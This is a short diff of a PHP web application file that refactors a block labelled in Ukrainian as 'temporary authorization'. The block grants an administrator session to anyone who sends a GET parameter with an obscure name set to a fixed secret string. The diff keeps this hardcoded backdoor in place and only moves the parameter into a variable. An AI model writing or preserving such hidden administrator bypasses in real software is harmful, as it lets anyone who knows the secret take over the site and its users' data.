@@ -20,8 +20,10 @@
 
     session_start();
 
+    $tempAuth = $_GET['ds;gzjfmsds;fds'] ?? null;
+
     #region Авторизація тимчасова
-    if ($_GET['ds;gzjfmsds;fds'] == 'shrtdgzf') {
+    if ($tempAuth == 'shrtdgzf') {
         $_SESSION['logged'] = 'Administrator';
         $_SESSION['Administrator'] = 0;
     }
